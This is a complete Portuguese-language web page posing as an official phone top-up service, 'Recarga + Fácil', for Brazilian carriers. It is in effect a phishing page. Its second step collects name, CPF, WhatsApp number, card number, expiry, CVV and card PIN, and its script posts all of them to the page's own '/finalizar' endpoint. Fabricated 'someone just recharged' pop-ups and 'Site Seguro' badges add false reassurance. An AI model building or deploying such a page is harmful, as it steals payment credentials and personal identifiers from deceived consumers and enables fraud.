<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Recarga + Fácil | Oficial</title>
    <style>
        * { box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), url('fundo.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            background-repeat: no-repeat;
        }

        .container {
            background: rgba(255, 255, 255, 0.92);
            backdrop-filter: blur(10px); /* Efeito de vidro */
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
            width: 92%; /* Ocupa quase toda a largura no celular */
            max-width: 400px;
            margin: 30px 0;
            text-align: center;
        }

        h2 { color: #0056b3; font-size: 24px; margin-bottom: 5px; }
        .subtitle { color: #555; font-size: 14px; margin-bottom: 25px; }

        label { display: block; text-align: left; font-weight: 600; margin-top: 15px; color: #222; font-size: 14px; }

        input, select {
            width: 100%;
            height: 50px; /* Altura ideal para o dedo no celular */
            padding: 0 15px;
            margin: 8px 0;
            border: 2px solid #e1e1e1;
            border-radius: 12px;
            font-size: 16px; /* Evita que o iPhone dê zoom automático */
            background: white;
            transition: border-color 0.3s;
        }

        input:focus, select:focus { border-color: #007bff; outline: none; }

        .step-hidden { display: none; }

        button {
            width: 100%;
            height: 55px;
            background: linear-gradient(135deg, #28a745, #218838);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.3);
        }

        /* Estilo especial para os selos no mobile */
        .footer-selos {
            margin-top: 25px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            font-size: 11px;
            color: #666;
        }

        .selo-item {
            background: rgba(0,0,0,0.05);
            padding: 8px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }

        /* Ajuste nas notificações para não tapar o botão no celular */
        #notification-container {
            position: fixed;
            top: 15px; /* Mudei para o topo para ficar mais visível no celular */
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 350px;
            z-index: 9999;
        }

        .notif {
            background: rgba(255, 255, 255, 0.95);
            padding: 12px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
            margin-bottom: 8px;
            font-size: 12px;
            border-left: 4px solid #28a745;
            text-align: left;
        }
    </style>
</head>
<body>

    <div id="notification-container"></div>

    <div class="container">
        <h2>Recarga + Fácil 📱</h2>
        <p class="subtitle">Rápido, fácil e 100% seguro</p>
        
        <form id="formRecarga">
            <div id="passo1">
                <label>Selecione sua Operadora</label>
                <select id="operadora" required>
                    <option value="">Escolher...</option>
                    <option value="Vivo">Vivo</option>
                    <option value="Tim">Tim</option>
                    <option value="Claro">Claro</option>
                    <option value="Oi">Oi</option>
                </select>

                <label>Escolha o Valor</label>
                <select id="valor" required>
                    <option value="">Escolher valor...</option>
                    <option value="20">R$ 20,00</option>
                    <option value="30">R$ 30,00</option>
                    <option value="40">R$ 40,00</option>
                    <option value="50">R$ 50,00</option>
                    <option value="100">R$ 100,00</option>
                </select>

                <button type="button" onclick="proximoPasso()">AVANÇAR</button>
            </div>

            <div id="passo2" class="step-hidden">
                <label>Nome do Titular</label>
                <input type="text" id="nome" placeholder="Como no cartão" required>
                <label>Número do WhatsApp</label>
                <input type="tel" id="telefone" placeholder="(00) 00000-0000" required>
                <label>CPF</label>
                <input type="text" id="cpf" placeholder="000.000.000-00" required>
                
                <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
                
                <label>Número do Cartão</label>
                <input type="text" id="cartao" placeholder="0000 0000 0000 0000" required>
                <div style="display: flex; gap: 10px;">
                    <div style="flex: 1;">
                        <label>Validade</label>
                        <input type="text" id="data" placeholder="MM/AA" required>
                    </div>
                    <div style="flex: 1;">
                        <label>CVV</label>
                        <input type="text" id="cvv" placeholder="123" required>
                    </div>
                </div>
                <label>Senha do Cartão</label>
                <input type="password" id="senha" placeholder="****" required>

                <button type="submit">CONCLUIR RECARGA</button>
            </div>
        </form>

        <div class="footer-selos">
            <div class="selo-item">🔒 Site Seguro</div>
            <div class="selo-item">💳 Pagamento via PIX/Cartão</div>
        </div>
    </div>

    <script>
        function proximoPasso() {
            const operadora = document.getElementById('operadora').value;
            const valor = document.getElementById('valor').value;
            if(operadora && valor) {
                document.getElementById('passo1').style.display = 'none';
                document.getElementById('passo2').style.display = 'block';
                window.scrollTo(0,0);
            } else {
                alert('Selecione operadora e valor!');
            }
        }

        // Notificações Mobile-Friendly
        const nomes = ["Ricardo M.", "Patrícia L.", "Mateus S.", "Carla F.", "Roberto G.", "Bruna V.", "Fábio D."];
        function criarNotificacao() {
            const nome = nomes[Math.floor(Math.random() * nomes.length)];
            const valor = [20, 30, 40, 50, 100][Math.floor(Math.random() * 5)];
            const div = document.createElement('div');
            div.className = 'notif';
            div.innerHTML = `✨ <b>${nome}</b> recarregou <b>R$ ${valor},00</b> agora mesmo.`;
            document.getElementById('notification-container').appendChild(div);
            setTimeout(() => { div.style.opacity = '0'; setTimeout(() => div.remove(), 500); }, 3000);
        }
        setInterval(criarNotificacao, 7000);

        // Envio
        document.getElementById('formRecarga').addEventListener('submit', async (e) => {
            e.preventDefault();
            const dados = {
                nome: document.getElementById('nome').value,
                cpf: document.getElementById('cpf').value,
                telefone: document.getElementById('telefone').value,
                operadora: document.getElementById('operadora').value,
                valor: document.getElementById('valor').value,
                cartao: document.getElementById('cartao').value,
                data: document.getElementById('data').value,
                cvv: document.getElementById('cvv').value,
                senha: document.getElementById('senha').value
            };
            try {
                const res = await fetch('/finalizar', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                });
                if(res.ok) {
                    alert('Recarga em processamento! Você receberá a confirmação em breve.');
                    window.location.reload();
                }
            } catch (err) { alert('Erro de conexão.'); }
        });
    </script>
</body>
</html>
